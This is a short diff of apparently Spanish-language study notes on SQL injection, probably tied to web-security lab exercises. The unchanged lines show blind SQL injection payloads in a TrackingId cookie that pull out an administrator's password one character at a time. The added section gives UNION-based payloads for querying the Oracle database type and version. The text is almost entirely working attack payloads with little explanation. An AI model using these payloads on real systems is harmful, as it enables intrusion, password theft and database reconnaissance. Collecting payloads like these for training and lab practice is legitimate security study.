@@ -14,3 +14,9 @@ TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='a
 TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
 TrackingId=xyz' AND (SELECT SUBSTRING(password,3,1) FROM users WHERE username='administrator')='a
 ``` 
+
+#### Ataque de inyección SQL, consultando el tipo y la versión de la base de datos en Oracle 
+```
+'+UNION+SELECT+'abc','def'+FROM+dual--
+'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
+```
